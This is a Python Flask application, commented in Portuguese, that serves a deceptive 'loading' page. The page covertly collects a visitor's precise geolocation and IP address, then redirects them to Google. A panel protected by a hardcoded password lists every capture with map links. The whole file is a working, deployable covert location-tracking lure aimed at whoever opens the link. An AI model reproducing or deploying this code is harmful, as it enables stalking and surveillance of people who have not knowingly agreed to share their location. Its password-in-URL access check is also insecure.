from flask import Flask, render_template_string, request, jsonify
import datetime

app = Flask(__name__)

# Lista temporária para guardar as localizações na memória do servidor
# (Nota: se o servidor reiniciar no Render, a lista limpa, o que é ótimo para testes)
registros_localizacao = []

# Senha simples para o seu painel
SENHA_ADMIN = "123123"

# Página HTML de Captura (Falsa página de carregamento)
HTML_CAPTURA = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 20%; background-color: #f4f4f9; }
        h2 { color: #333; }
    </style>
</head>
<body>
    <h2>Carregando conteúdo, por favor aguarde...</h2>
    <script>
        function enviarLocalizacao(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            fetch('/salvar-loc', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon, precisao: accuracy })
            }).then(() => {
                window.location.href = "https://google.com";
            });
        }

        function erroLocalizacao(error) {
            console.log("Erro ou negado: " + error.message);
            window.location.href = "https://google.com";
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(enviarLocalizacao, erroLocalizacao, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            window.location.href = "https://google.com";
        }
    </script>
</body>
</html>
"""

# Painel Administrativo HTML
HTML_PAINEL = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Painel de Localizações</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f4f4f9; }
        h2 { color: #333; }
        table { width: 100%; border-collapse: collapse; background: white; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
        th { background: #007bff; color: white; }
        tr:nth-child(even) { background: #f9f9f9; }
        a { color: #007bff; text-decoration: none; font-weight: bold; }
        a:hover { text-decoration: underline; }
        .erro { color: red; font-weight: bold; text-align: center; }
    </style>
</head>
<body>
    <h2>Painel de Registros Capturados</h2>
    <p>Total de capturas: {{ registros|length }}</p>
    <table>
        <tr>
            <th>Data/Hora</th>
            <th>IP</th>
            <th>Latitude / Longitude</th>
            <th>Precisão</th>
            <th>Google Maps</th>
        </tr>
        {% for r in registros %}
        <tr>
            <td>{{ r.data }}</td>
            <td>{{ r.ip }}</td>
            <td>{{ r.lat }}, {{ r.lon }}</td>
            <td>{{ r.precisao }} metros</td>
            <td><a href="{{ r.maps }}" target="_blank">Abrir no Mapa</a></td>
        </tr>
        {% else %}
        <tr><td colspan="5" class="erro">Nenhuma localização capturada ainda.</td></tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_CAPTURA)

@app.route('/salvar-loc', methods=['POST'])
def salvar_loc():
    dados = request.json
    lat = dados.get('latitude')
    lon = dados.get('longitude')
    precisao = dados.get('precisao')
    
    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    
    # Salva na lista da memória
    registros_localizacao.insert(0, {
        "data": agora,
        "ip": ip_cliente,
        "lat": lat,
        "lon": lon,
        "precisao": precisao,
        "maps": maps_link
    })
    
    return jsonify({"status": "sucesso"})

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    # Simples verificação de senha via parâmetro na URL: /admin?senha=123123
    senha_informada = request.args.get('senha', '')
    if senha_informada != SENHA_ADMIN:
        return """
        <body style="font-family: Arial; text-align: center; margin-top: 15%;">
            <h2>Painel Protegido</h2>
            <p>Acesse informando a senha na URL, por exemplo: <code>/admin?senha=SUA_SENHA</code></p>
        </body>
        """, 403
        
    return render_template_string(HTML_PAINEL, registros=registros_localizacao)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)